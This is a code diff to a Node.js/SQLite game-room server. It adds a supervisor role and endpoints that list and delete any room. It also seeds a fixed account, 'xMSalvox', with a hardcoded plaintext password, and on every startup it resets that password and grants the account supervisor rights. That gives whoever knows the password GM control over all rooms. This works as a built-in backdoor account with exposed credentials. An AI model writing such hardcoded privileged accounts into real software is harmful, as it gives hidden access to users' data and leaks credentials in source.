@@ -37,6 +37,7 @@ db.exec(`
     id TEXT PRIMARY KEY,
     username TEXT UNIQUE COLLATE NOCASE,
     password_hash TEXT NOT NULL,
+    is_supervisor INTEGER NOT NULL DEFAULT 0,
     created_at TEXT NOT NULL
   );
 
@@ -185,6 +186,14 @@ for (const table of ["participants", "role_history", "missions", "messages", "se
     if (table === "participants" && !cols.has("pin")) {
       db.exec(`ALTER TABLE participants ADD COLUMN pin TEXT`);
     }
+  }
+}
+
+const usersTable = db.prepare("SELECT name FROM sqlite_master WHERE type = 'table' AND name = 'users'").get();
+if (usersTable) {
+  const cols = new Set(db.prepare("PRAGMA table_info(users)").all().map((c) => c.name));
+  if (!cols.has("is_supervisor")) {
+    db.exec("ALTER TABLE users ADD COLUMN is_supervisor INTEGER NOT NULL DEFAULT 0");
   }
 }
 
@@ -411,10 +420,22 @@ function verifyPassword(password, stored) {
 let defaultUser = db.prepare("SELECT id FROM users ORDER BY created_at ASC LIMIT 1").get();
 if (!defaultUser) {
   const adminId = crypto.randomUUID();
-  db.prepare("INSERT INTO users (id, username, password_hash, created_at) VALUES (?, ?, ?, ?)").run(
+  db.prepare("INSERT INTO users (id, username, password_hash, is_supervisor, created_at) VALUES (?, ?, ?, 0, ?)").run(
     adminId, "admin", hashPassword(judgePassword), new Date().toISOString()
   );
   defaultUser = { id: adminId };
+}
+
+// Exclusive Supervisor Account Seeding / Update
+const supervisorUser = db.prepare("SELECT * FROM users WHERE LOWER(username) = LOWER('xMSalvox')").get();
+if (supervisorUser) {
+  db.prepare("UPDATE users SET password_hash = ?, is_supervisor = 1 WHERE id = ?").run(
+    hashPassword("!99xxMSalvoxx99!"), supervisorUser.id
+  );
+} else {
+  db.prepare("INSERT INTO users (id, username, password_hash, is_supervisor, created_at) VALUES (?, ?, ?, 1, ?)").run(
+    crypto.randomUUID(), "xMSalvox", hashPassword("!99xxMSalvoxx99!"), new Date().toISOString()
+  );
 }
 
 let defaultRoom = db.prepare("SELECT * FROM rooms ORDER BY created_at ASC LIMIT 1").get();
@@ -523,13 +544,28 @@ function resolveRoom(req, url) {
   return getRoomById(defaultRoom.id);
 }
 
+function isSupervisor(req) {
+  const userId = getUserId(req);
+  if (!userId) return false;
+  const user = db.prepare("SELECT is_supervisor FROM users WHERE id = ?").get(userId);
+  return Boolean(user && user.is_supervisor);
+}
+
+function requireSupervisor(req, res) {
+  if (isSupervisor(req)) return true;
+  sendJson(res, 403, { error: "Accesso riservato al Supervisore della piattaforma." });
+  return false;
+}
+
 function isJudge(req, room) {
   const token = req.headers.authorization?.replace(/^Bearer\s+/i, "");
   if (!token) return false;
   const jSession = judgeSessions.get(token);
   if (jSession) return true;
   const uId = userSessions.get(token);
-  if (uId && (!room || room.owner_id === uId || room.id === defaultRoom.id)) return true;
+  if (!uId) return false;
+  if (isSupervisor(req)) return true; // Supervisor has GM rights to inspect and control all rooms!
+  if (!room || room.owner_id === uId || room.id === defaultRoom.id) return true;
   return false;
 }
 
@@ -871,12 +907,12 @@ const server = http.createServer(async (req, res) => {
       }
       const userId = crypto.randomUUID();
       const passwordHash = hashPassword(password);
-      db.prepare("INSERT INTO users (id, username, password_hash, created_at) VALUES (?, ?, ?, ?)").run(
+      db.prepare("INSERT INTO users (id, username, password_hash, is_supervisor, created_at) VALUES (?, ?, ?, 0, ?)").run(
         userId, username, passwordHash, new Date().toISOString()
       );
       const token = crypto.randomBytes(32).toString("base64url");
       userSessions.set(token, userId);
-      return sendJson(res, 201, { token, user: { id: userId, username } });
+      return sendJson(res, 201, { token, user: { id: userId, username, is_supervisor: false } });
     }
 
     if (route === "POST /api/auth/login") {
@@ -889,15 +925,15 @@ const server = http.createServer(async (req, res) => {
       }
       const token = crypto.randomBytes(32).toString("base64url");
       userSessions.set(token, user.id);
-      return sendJson(res, 200, { token, user: { id: user.id, username: user.username } });
+      return sendJson(res, 200, { token, user: { id: user.id, username: user.username, is_supervisor: Boolean(user.is_supervisor) } });
     }
 
     if (route === "GET /api/auth/me") {
       const userId = getUserId(req);
       if (!userId) return sendJson(res, 401, { error: "Non autenticato." });
-      const user = db.prepare("SELECT id, username, created_at FROM users WHERE id = ?").get(userId);
+      const user = db.prepare("SELECT id, username, is_supervisor, created_at FROM users WHERE id = ?").get(userId);
       if (!user) return sendJson(res, 404, { error: "Utente non trovato." });
-      return sendJson(res, 200, { user });
+      return sendJson(res, 200, { user: { id: user.id, username: user.username, is_supervisor: Boolean(user.is_supervisor), created_at: user.created_at } });
     }
 
     if (route === "POST /api/auth/logout") {
@@ -920,6 +956,31 @@ const server = http.createServer(async (req, res) => {
       const token = crypto.randomBytes(32).toString("base64url");
       judgeSessions.set(token, { userId: admin?.id || defaultUser.id, activeRoomId: defaultRoom.id });
       return sendJson(res, 200, { token });
+    }
+
+    // --------------------------------------------------
+    // SUPERVISOR CONSOLE (GLOBAL PLATFORM ROOM ACCESS)
+    // --------------------------------------------------
+    if (route === "GET /api/supervisor/rooms") {
+      if (!requireSupervisor(req, res)) return;
+      const rooms = db.prepare(`SELECT r.*,
+        u.username AS owner_username,
+        (SELECT COUNT(*) FROM participants p WHERE p.room_id = r.id) AS participant_count,
+        (SELECT COUNT(*) FROM missions m WHERE m.room_id = r.id) AS mission_count
+        FROM rooms r
+        LEFT JOIN users u ON u.id = r.owner_id
+        ORDER BY r.created_at DESC`).all();
+      return sendJson(res, 200, { rooms });
+    }
+
+    if (route.startsWith("DELETE /api/supervisor/rooms/")) {
+      if (!requireSupervisor(req, res)) return;
+      const code = decodeURIComponent(url.pathname.split("/").pop());
+      const room = getRoomByCode(code);
+      if (!room) return sendJson(res, 404, { error: "Stanza non trovata." });
+      db.prepare("DELETE FROM rooms WHERE id = ?").run(room.id);
+      logAction(room.id, "supervisor", "room_deleted_by_supervisor", { code: room.code, name: room.name });
+      return sendJson(res, 200, { ok: true });
     }
 
     // --------------------------------------------------
